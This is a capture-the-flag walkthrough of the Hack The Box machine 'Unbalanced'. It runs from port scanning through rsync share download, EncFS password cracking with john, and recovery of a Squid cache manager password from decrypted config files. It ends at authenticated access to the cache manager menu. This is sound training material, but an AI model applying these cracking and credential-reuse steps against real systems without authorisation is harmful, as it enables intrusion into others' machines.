---
title: "Unbalanced"
difficulty: Hard
os: Linux
points: 40
rating: 4.7
date: 2020-08-01
avatar: assets/htb/unbalanced.png
htb_url: https://app.hackthebox.com/machines/Unbalanced
---
## Enumeration

### Nmap scan

I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to dump the results under the filename `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ nmap -p- -sCV -n -v -oA unbalanced <YOUR_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-13 20:15 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Initiating Ping Scan at 20:15
Scanning <YOUR_IP> [2 ports]
Completed Ping Scan at 20:15, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 20:15
Scanning <YOUR_IP> [65535 ports]
Discovered open port 22/tcp on <YOUR_IP>
Discovered open port 873/tcp on <YOUR_IP>
Discovered open port 3128/tcp on <YOUR_IP>
Completed Connect Scan at 20:15, 41.82s elapsed (65535 total ports)
Initiating Service scan at 20:15
Scanning 3 services on <YOUR_IP>
Completed Service scan at 20:16, 11.18s elapsed (3 services on 1 host)
NSE: Script scanning <YOUR_IP>.
Initiating NSE at 20:16
Completed NSE at 20:16, 1.70s elapsed
Initiating NSE at 20:16
Completed NSE at 20:16, 0.19s elapsed
Initiating NSE at 20:16
Completed NSE at 20:16, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.052s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:16
Completed NSE at 20:16, 0.00s elapsed
Initiating NSE at 20:16
Completed NSE at 20:16, 0.00s elapsed
Initiating NSE at 20:16
Completed NSE at 20:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.27 seconds
```

Three ports were open: 22 (SSH), 873 (Rsync), and 3128, which nmap flagged as an HTTP Squid proxy.

![](assets/wu/unbalanced/img-1.png)

[https://en.wikipedia.org/wiki/Rsync](https://en.wikipedia.org/wiki/Rsync)

> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression, and SSH or stunnel can be used for security.
>
> Rsync is typically used for synchronizing files and directories between two different systems. For example, if the command rsync local-file user@remote-host:remote-file is run, rsync will use SSH to connect as user to remote-host. Once connected, it will invoke the remote host's rsync and then the two programs will determine what parts of the local file need to be transferred so that the remote file matches the local one.
>
> Rsync can also operate in a daemon mode \(rsyncd\), serving and receiving files in the native rsync protocol \(using the "rsync://" syntax\).

I came across an article covering how to pentest port 873 (rsync) - [https://book.hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

```text
┌──(kac0㉿kali)-[~/htb/openkeys]
└─$ nc -vn <YOUR_IP> 873
(UNKNOWN) [<YOUR_IP>] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list 
conf_backups    EncFS-encrypted configuration backups
@RSYNCD: EXIT
```

it looked like the box exposed a share of EncFS-encrypted configuration backups

```text
┌──(kac0㉿kali)-[~/htb/openkeys]
└─$ rsync -av rsync://<YOUR_IP>:873/conf_backups ./conf_backups                                 1 ⨯
receiving incremental file list
created directory ./conf_backups
./
,CBjPJW4EGlcqwZW4nmVqBA6
-FjZ6-6,Fa,tMvlDsuVAO7ek
.encfs6.xml
0K72OfkNRRx3-f0Y6eQKwnjn
27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
2VyeljxHWrDX37La6FhUGIJS
3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
3cdBkrRF7R5bYe1ZJ0KYy786
3xB4vSQH-HKVcOMQIs02Qb9,
4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
5FTRnQDoLdRfOEPkrhM2L29P
5IUA28wOw0wwBs8rP5xjkFSs
6R1rXixtFRQ5c9ScY8MBQ1Rg
7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
8CBL-MBKTDMgB6AT2nfWfq-e
8XDA,IOhFFlhh120yl54Q0da
8e6TAzw0xs2LVxgohuXHhWjM
9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
A4qOD1nvqe9JgKnslwk1sUzO
Acv0PEQX8vs-KdK307QNHaiF
B6J5M3OP0X7W25ITnaZX753T
Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
ECXONXBBRwhb5tYOIcjjFZzh
F4F9opY2nhVVnRgiQ,OUs-Y0
FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
FSXWRSwW6vOvJ0ExPK0fXJ6F
IymL3QugM,XxLuKEdwJJOOpi
KPYfvxIoOlrRjTY18zi8Wne-
Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
Kpo3MHQxksW2uYX79XngQu-f
KtFc,DR7HqmGdPOkM2CpLaM9
Mv5TtpmUNnVl-fgqQeYAy8uu
MxgjShAeN6AmkH2tQAsfaj6C
Ni8LDatT134DF6hhQf5ESpo5
Nlne5rpWkOxkPNC15SEeJ8g,
OFG2vAoaW3Tvv1X2J5fy4UV8
OvBqims-kvgGyJJqZ59IbGfy
StlxkG05UY9zWNHBhXxukuP9
TZGfSHeAM42o9TgjGUdOSdrd
VQjGnKU1puKhF6pQG1aah6rc
W5,ILrUB4dBVW-Jby5AUcGsz
Wr0grx0GnkLFl8qT3L0CyTE6
X93-uArUSTL,kiJpOeovWTaP
Ya30M5le2NKbF6rD-qD3M-7t
Yw0UEJYKN,Hjf-QGqo3WObHy
Z8,hYzUjW0GnBk1JP,8ghCsC
ZXUUpn9SCTerl0dinZQYwxrx
ZvkMNEBKPRpOHbGoefPa737T
a4zdmLrBYDC24s9Z59y-Pwa2
c9w3APbCYWfWLsq7NFOdjQpA
cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
dF2GU58wFl3x5R7aDE6QEnDj
dNTEvgsjgG6lKBr8ev8Dw,p7
gK5Z2BBMSh9iFyCFfIthbkQ6
gRhKiGIEm4SvYkTCLlOQPeh-
hqZXaSCJi-Jso02DJlwCtYoz
iaDKfUAHJmdqTDVZsmCIS,Bn
jIY9q65HMBxJqUW48LJIc,Fj
kdJ5whfqyrkk6avAhlX-x0kh
kheep9TIpbbdwNSfmNU1QNk-
l,LY6YoFepcaLg67YoILNGg0
lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
mMGincizgMjpsBjkhWq-Oy0D
oPu0EVyHA6,KmoI1T,LTs83x
pfTT,nZnCUFzyPPOeX9NwQVo
pn6YPUx69xqxRXKqg5B5D2ON
q5RFgoRK2Ttl3U5W8fjtyriX
qeHNkZencKDjkr3R746ZzO5K
sNiR-scp-DZrXHg4coa9KBmZ
sfT89u8dsEY4n99lNsUFOwki
uEtPZwC2tjaQELJmnNRTCLYU
vCsXjR1qQmPO5g3P3kiFyO84
waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

sent 1,452 bytes  received 411,990 bytes  35,951.48 bytes/sec
total size is 405,603  speedup is 0.98
```

I downloaded the files locally with `rsync`.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced/conf_backups]
└─$ ls -l | base64 -d > files
base64: invalid input
┌──(kac0㉿kali)-[~/htb/unbalanced/conf_backups]
└─$ cat .encfs6.xml
```

At first the filenames seemed to be base64, but I soon worked out they were probably AES encrypted, and the `.encfs6.xml` confirmed it.

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="7">
    <cfg class_id="0" tracking_level="0" version="20">
        <version>20100713</version>
        <creator>EncFS 1.9.5</creator>
        <cipherAlg class_id="1" tracking_level="0" version="0">
            <name>ssl/aes</name>
            <major>3</major>
            <minor>0</minor>
        </cipherAlg>
        <nameAlg>
            <name>nameio/block</name>
            <major>4</major>
            <minor>0</minor>
        </nameAlg>
        <keySize>192</keySize>
        <blockSize>1024</blockSize>
        <plainData>0</plainData>
        <uniqueIV>1</uniqueIV>
        <chainedNameIV>1</chainedNameIV>
        <externalIVChaining>0</externalIVChaining>
        <blockMACBytes>0</blockMACBytes>
        <blockMACRandBytes>0</blockMACRandBytes>
        <allowHoles>1</allowHoles>
        <encodedKeySize>44</encodedKeySize>
        <encodedKeyData>
GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
</encodedKeyData>
        <saltLen>20</saltLen>
        <saltData>
mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
</saltData>
        <kdfIterations>580280</kdfIterations>
        <desiredKDFDuration>500</desiredKDFDuration>
    </cfg>
</boost_serialization>
```

This XML had everything required to decrypt the files, save for one piece...

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ encfs /home/kac0/htb/unbalanced/conf_backups /home/kac0/htb/unbalanced/decrypted         1 ⨯
EncFS Password: 
Error decoding volume key, password incorrect
```

After installing `encfs` and trying to decrypt the data, I learned a password was required. Looking up how to crack the key out of the .encfs6.xml file, I found [https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml), which pointed me to an "X2john" tool I wasn't aware of: `encfs2john`.

![](assets/wu/unbalanced/img-2.png)

During the install I hit this warning 

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ /usr/share/john/encfs2john.py conf_backups/.encfs6.xml > encfshash
conf_backups/.encfs6.xml doesn't have .encfs6.xml!

┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ /usr/share/john/encfs2john.py conf_backups/ > encfshash
```

It turned out `encfs2john` expects a directory rather than a lone file. Pointing it at the directory produced a hash

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt encfshash                                   127 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (conf_backups/)
1g 0:00:00:06 DONE (2020-11-14 14:04) 0.1615g/s 118.9p/s 118.9c/s 118.9C/s bambam..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

john cracked the hash almost immediately, revealing the password to be...`bubblegum`.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ encfs /home/kac0/htb/unbalanced/conf_backups /home/kac0/htb/unbalanced/decrypted
EncFS Password:
```

With the password in hand, I used `encfs` to mount the encrypted `conf_backups` and expose the decrypted files in a folder.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ cd decrypted 

┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
└─$ ls -la                   
total 628
drwxr-xr-x 2 kac0 kac0   4096 Nov 14 13:44 .
drwxr-xr-x 4 kac0 kac0   4096 Nov 14 14:01 ..
-rw-r--r-- 1 kac0 kac0    267 Apr  4  2020 50-localauthority.conf
-rw-r--r-- 1 kac0 kac0    455 Apr  4  2020 50-nullbackend.conf
-rw-r--r-- 1 kac0 kac0     48 Apr  4  2020 51-debian-sudo.conf
-rw-r--r-- 1 kac0 kac0    182 Apr  4  2020 70debconf
-rw-r--r-- 1 kac0 kac0   2351 Apr  4  2020 99-sysctl.conf
-rw-r--r-- 1 kac0 kac0   4564 Apr  4  2020 access.conf
-rw-r--r-- 1 kac0 kac0   2981 Apr  4  2020 adduser.conf
-rw-r--r-- 1 kac0 kac0   1456 Apr  4  2020 bluetooth.conf
-rw-r--r-- 1 kac0 kac0   5713 Apr  4  2020 ca-certificates.conf
-rw-r--r-- 1 kac0 kac0    662 Apr  4  2020 com.ubuntu.SoftwareProperties.conf
-rw-r--r-- 1 kac0 kac0    246 Apr  4  2020 dconf
-rw-r--r-- 1 kac0 kac0   2969 Apr  4  2020 debconf.conf
-rw-r--r-- 1 kac0 kac0    230 Apr  4  2020 debian.conf
-rw-r--r-- 1 kac0 kac0    604 Apr  4  2020 deluser.conf
-rw-r--r-- 1 kac0 kac0   1735 Apr  4  2020 dhclient.conf
-rw-r--r-- 1 kac0 kac0    346 Apr  4  2020 discover-modprobe.conf
-rw-r--r-- 1 kac0 kac0    127 Apr  4  2020 dkms.conf
-rw-r--r-- 1 kac0 kac0     21 Apr  4  2020 dns.conf
-rw-r--r-- 1 kac0 kac0    652 Apr  4  2020 dnsmasq.conf
-rw-r--r-- 1 kac0 kac0   1875 Apr  4  2020 docker.conf
-rw-r--r-- 1 kac0 kac0     38 Apr  4  2020 fakeroot-x86_64-linux-gnu.conf
-rw-r--r-- 1 kac0 kac0    906 Apr  4  2020 framework.conf
-rw-r--r-- 1 kac0 kac0    280 Apr  4  2020 fuse.conf
-rw-r--r-- 1 kac0 kac0   2584 Apr  4  2020 gai.conf
-rw-r--r-- 1 kac0 kac0   3635 Apr  4  2020 group.conf
-rw-r--r-- 1 kac0 kac0   5060 Apr  4  2020 hdparm.conf
-rw-r--r-- 1 kac0 kac0      9 Apr  4  2020 host.conf
-rw-r--r-- 1 kac0 kac0   1269 Apr  4  2020 initramfs.conf
-rw-r--r-- 1 kac0 kac0    927 Apr  4  2020 input.conf
-rw-r--r-- 1 kac0 kac0   1042 Apr  4  2020 journald.conf
-rw-r--r-- 1 kac0 kac0    144 Apr  4  2020 kernel-img.conf
-rw-r--r-- 1 kac0 kac0    332 Apr  4  2020 ldap.conf
-rw-r--r-- 1 kac0 kac0     34 Apr  4  2020 ld.so.conf
-rw-r--r-- 1 kac0 kac0    191 Apr  4  2020 libaudit.conf
-rw-r--r-- 1 kac0 kac0     44 Apr  4  2020 libc.conf
-rw-r--r-- 1 kac0 kac0   2161 Apr  4  2020 limits.conf
-rw-r--r-- 1 kac0 kac0    150 Apr  4  2020 listchanges.conf
-rw-r--r-- 1 kac0 kac0   1042 Apr  4  2020 logind.conf
-rw-r--r-- 1 kac0 kac0    435 Apr  4  2020 logrotate.conf
-rw-r--r-- 1 kac0 kac0   4491 Apr  4  2020 main.conf
-rw-r--r-- 1 kac0 kac0    812 Apr  4  2020 mke2fs.conf
-rw-r--r-- 1 kac0 kac0    195 Apr  4  2020 modules.conf
-rw-r--r-- 1 kac0 kac0   1440 Apr  4  2020 namespace.conf
-rw-r--r-- 1 kac0 kac0    120 Apr  4  2020 network.conf
-rw-r--r-- 1 kac0 kac0    529 Apr  4  2020 networkd.conf
-rw-r--r-- 1 kac0 kac0    510 Apr  4  2020 nsswitch.conf
-rw-r--r-- 1 kac0 kac0   1331 Apr  4  2020 org.freedesktop.PackageKit.conf
-rw-r--r-- 1 kac0 kac0    706 Apr  4  2020 PackageKit.conf
-rw-r--r-- 1 kac0 kac0    552 Apr  4  2020 pam.conf
-rw-r--r-- 1 kac0 kac0   2972 Apr  4  2020 pam_env.conf
-rw-r--r-- 1 kac0 kac0   1583 Apr  4  2020 parser.conf
-rw-r--r-- 1 kac0 kac0    324 Apr  4  2020 protect-links.conf
-rw-r--r-- 1 kac0 kac0   3267 Apr  4  2020 reportbug.conf
-rw-r--r-- 1 kac0 kac0     87 Apr  4  2020 resolv.conf
-rw-r--r-- 1 kac0 kac0    649 Apr  4  2020 resolved.conf
-rw-r--r-- 1 kac0 kac0    146 Apr  4  2020 rsyncd.conf
-rw-r--r-- 1 kac0 kac0   1988 Apr  4  2020 rsyslog.conf
-rw-r--r-- 1 kac0 kac0   2041 Apr  4  2020 semanage.conf
-rw-r--r-- 1 kac0 kac0    419 Apr  4  2020 sepermit.conf
-rw-r--r-- 1 kac0 kac0    790 Apr  4  2020 sleep.conf
-rw-r--r-- 1 kac0 kac0 316553 Apr  4  2020 squid.conf
-rw-r--r-- 1 kac0 kac0   2351 Apr  4  2020 sysctl.conf
-rw-r--r-- 1 kac0 kac0   1628 Apr  4  2020 system.conf
-rw-r--r-- 1 kac0 kac0   2179 Apr  4  2020 time.conf
-rw-r--r-- 1 kac0 kac0    677 Apr  4  2020 timesyncd.conf
-rw-r--r-- 1 kac0 kac0   1260 Apr  4  2020 ucf.conf
-rw-r--r-- 1 kac0 kac0    281 Apr  4  2020 udev.conf
-rw-r--r-- 1 kac0 kac0    378 Apr  4  2020 update-initramfs.conf
-rw-r--r-- 1 kac0 kac0   1130 Apr  4  2020 user.conf
-rw-r--r-- 1 kac0 kac0    414 Apr  4  2020 user-dirs.conf
-rw-r--r-- 1 kac0 kac0   1889 Apr  4  2020 Vendor.conf
-rw-r--r-- 1 kac0 kac0   1513 Apr  4  2020 wpa_supplicant.conf
-rw-r--r-- 1 kac0 kac0    100 Apr  4  2020 x86_64-linux-gnu.conf
-rw-r--r-- 1 kac0 kac0    642 Apr  4  2020 xattr.conf
```

As it turned out, the folder held backups of the system's configuration files. Plenty of juicy detail to dig through here!

![](assets/wu/unbalanced/img-3.png)

```text
#Default:
# Deny, unless rules exist in squid.conf.
#

#
# Recommended minimum Access Permission configuration:
#
# Deny requests to certain unsafe ports
http_access deny !Safe_ports

# Deny CONNECT to other than secure SSL ports
http_access deny CONNECT !SSL_ports

# Only allow cachemgr access from localhost
#http_access allow localhost manager
#http_access deny manager
http_access allow manager

# We strongly recommend the following be uncommented to protect innocent
# web applications running on the proxy server who think the only
# one who can access services on "localhost" is a local user
#http_access deny to_localhost

#
# INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS
#
include /etc/squid/conf.d/*

# Example rule allowing access from your local networks.
# Adapt localnet in the ACL section to list your (internal) IP networks
# from where browsing should be allowed
#http_access allow localnet
http_access allow localhost

# Allow access to intranet
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net

# And finally deny all other access to this proxy
http_access deny all
#http_access allow all
```

Among the squid configuration rules I spotted the subdomain `intranet.unbalanced.htb`, so I added it to my `/etc/hosts` file.

```text
#  TAG: cachemgr_passwd
#       Specify passwords for cachemgr operations.
#
#       Usage: cachemgr_passwd password action action ...
#
#       Some valid actions are (see cache manager menu for a full list):
#               5min
#               60min
#               asndb
#               authenticator
#               cbdata
#               client_list
#               comm_incoming
#               config *
#               counters
#               delay
#               digest_stats
#               dns
#               events
#               filedescriptors
#               fqdncache
#               histograms
#               http_headers
#               info
#               io
#               ipcache
#               mem
#               menu
#               netdb
#               non_peers
#               objects
#               offline_toggle *
#               pconn
#               peer_select
#               reconfigure *
#               redirector
#               refresh
#               server_list
#               shutdown *
#               store_digest
#               storedir
#               utilization
#               via_headers
#       * Indicates actions which will not be performed without a
#         valid password, others can be performed if not listed here.
#
#       To disable an action, set the password to "disable".
#       To allow performing an action without a password, set the
#       password to "none".
#
#       Use the keyword "all" to set the same password for all actions.
#
#Example:
# cachemgr_passwd secret shutdown
# cachemgr_passwd lesssssssecret info stats/objects
# cachemgr_passwd disable all
#Default:
# No password. Actions which require password are denied.
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
```

a password of `Thah$Sh1` was set, unlocking many of the manager actions

```text
┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
└─$ nikto -host 127.0.0.1 -useproxy http://<YOUR_IP>:3128                                     130 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          127.0.0.1
+ Target Hostname:    127.0.0.1
+ Target Port:        80
+ Proxy:              <YOUR_IP>:3128
+ Start Time:         2020-11-14 15:23:10 (GMT-5)
---------------------------------------------------------------------------
+ Server: squid/4.6
+ Retrieved via header: 1.1 unbalanced (squid/4.6)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-cache-lookup' found, with contents: NONE from unbalanced:3128
+ Uncommon header 'x-squid-error' found, with contents: ERR_ACCESS_DENIED 0
+ Uncommon header 'x-cache' found, with contents: MISS from unbalanced
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 26519 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2020-11-14 15:59:20 (GMT-5) (2170 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I ran nikto to look for vulnerabilities; it flagged several backdoors, but these were clearly false positives since none of them actually existed.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
└─$ curl -v -x http://<YOUR_IP>:3128 http://intranet.unbalanced.htb
*   Trying <YOUR_IP>:3128...
* Connected to <YOUR_IP> (<YOUR_IP>) port 3128 (#0)
> GET http://intranet.unbalanced.htb/ HTTP/1.1
> Host: intranet.unbalanced.htb
> User-Agent: curl/7.72.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sat, 14 Nov 2020 21:45:13 GMT
< Content-Type: text/html; charset=UTF-8
< Location: intranet.php
< Intranet-Host: intranet-host3.unbalanced.htb
< X-Cache: MISS from unbalanced
< X-Cache-Lookup: MISS from unbalanced:3128
< Transfer-Encoding: chunked
< Via: 1.1 unbalanced (squid/4.6)
< Connection: keep-alive
< 
* Connection #0 to host <YOUR_IP> left intact
```

![](assets/wu/unbalanced/fix-15.png)

while connecting to `intranet.unbalanced.htb` I noticed and added `intranet-host3.unbalanced.htb` to hosts, but access was denied.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
└─$ curl -v -x http://<YOUR_IP>:3128 http://intranet.unbalanced.htb/                       
*   Trying <YOUR_IP>:3128...
* Connected to <YOUR_IP> (<YOUR_IP>) port 3128 (#0)
> GET http://intranet.unbalanced.htb/ HTTP/1.1
> Host: intranet.unbalanced.htb
> User-Agent: curl/7.72.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sat, 14 Nov 2020 22:10:27 GMT
< Content-Type: text/html; charset=UTF-8
< Location: intranet.php
< Intranet-Host: intranet-host2.unbalanced.htb
< X-Cache: MISS from unbalanced
< X-Cache-Lookup: MISS from unbalanced:3128
< Transfer-Encoding: chunked
< Via: 1.1 unbalanced (squid/4.6)
< Connection: keep-alive
< 
* Connection #0 to host <YOUR_IP> left intact
```

this time the intranet host had changed: it came back as `host2`. Repeating the request a few times only ever returned host 2 and 3.

```text
┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
└─$ dirb http://intranet.unbalanced.htb /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -p <YOUR_IP>:3128 -w

-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Sat Nov 14 16:43:58 2020
URL_BASE: http://intranet.unbalanced.htb/
WORDLIST_FILES: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
PROXY: <YOUR_IP>:3128
OPTION: Not Stopping on warning messages
-----------------
GENERATED WORDS: 62239                                                         

---- Scanning URL: http://intranet.unbalanced.htb/ ----
==> DIRECTORY: http://intranet.unbalanced.htb/css/                                                                                                 
(!) FATAL: Too many errors connecting to host
    (Possible cause: URL MALFORMAT)
-----------------
END_TIME: Sat Nov 14 16:59:55 2020
DOWNLOADED: 22562 - FOUND: 0
```

only a single directory turned up. I tried again targeting files.

I looked for additional ways to enumerate squid -

* [https://blog.ashiny.cloud/2018/04/28/squid-proxy-quickref/](https://blog.ashiny.cloud/2018/04/28/squid-proxy-quickref/)
* [http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/](http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/)

> The squidclient utility is a simple HTTP client, with a few special features for use with Squid. For example, you can use a shortcut to request the cache manager pages. Rather than typing a long URL like this:

```text
% squidclient cache_object://cache.host.name/info
```

> you can use this shorter version:

```text
% squidclient mgr:info
```

going back to the config file, the manager actions that were permitted are listed here:

```text
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
```

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ squidclient -h <YOUR_IP> -p 3128 http://intranet-host2.unbalanced.htb mgr:menu
HTTP/1.1 401 Unauthorized
Server: squid/4.6
Mime-Version: 1.0
Date: Sat, 14 Nov 2020 22:21:05 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3749
X-Squid-Error: ERR_CACHE_MGR_ACCESS_DENIED 0
Vary: Accept-Language
Content-Language: en
WWW-Authenticate: Basic realm="menu"
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

...snipped...
</head><body id=ERR_CACHE_MGR_ACCESS_DENIED>
<div id="titles">
<h1>ERROR</h1>
<h2>Cache Manager Access Denied.</h2>
</div>
<hr>

<div id="content">
<p>The following error was encountered while trying to retrieve the URL: <a href="cache_object://<YOUR_IP>/menu">cache_object://<YOUR_IP>/menu</a></p>

<blockquote id="error">
<p><b>Cache Manager Access Denied.</b></p>
</blockquote>

<p>Sorry, you are not currently allowed to request cache_object://<YOUR_IP>/menu from this cache manager until you have authenticated yourself.</p>
...snipped...
```

I was clearly on the right track and just needed to authenticate using the password I'd recovered. The man page told me that `-w $password` handles proxy authentication

```text
┌──(kac0㉿kali)-[~/htb/unbalanced]
└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:menu
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sat, 14 Nov 2020 22:29:59 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sat, 14 Nov 2020 22:29:59 GMT
Last-Modified: Sat, 14 Nov 2020 22:29:59 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 index                  Cache Manager Interface                 disabled
 menu                   Cache Manager Menu                      protected
 offline_toggle         Toggle offline_mode setting             disabled
 shutdown               Shut Down the Squid Process             disabled
 reconfigure            Reconfigure Squid                       disabled
 rotate                 Rotate Squid Logs                       disabled
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 squidaio_counts        Async IO Function Counters              disabled
 config                 Current Squid Configuration             disabled
 client_list            Cache Client List                       disabled
 comm_epoll_incoming    comm_incoming() stats                   disabled
 ipcache                IP Cache Stats and Contents             disabled
 fqdncache              FQDN Cache Stats and Contents           protected
 idns                   Internal DNS Statistics                 disabled
 redirector             URL Redirector Stats                    disabled
 store_id               StoreId helper Stats                    disabled
 external_acl           External ACL stats                      disabled
 http_headers           HTTP Header Statistics                  disabled
 info                   General Runtime Information             disabled
 service_times          Service Times (Percentiles)             disabled
 filedescriptors        Process Filedescriptor Allocation       protected
 objects                All Cache Objects                       protected
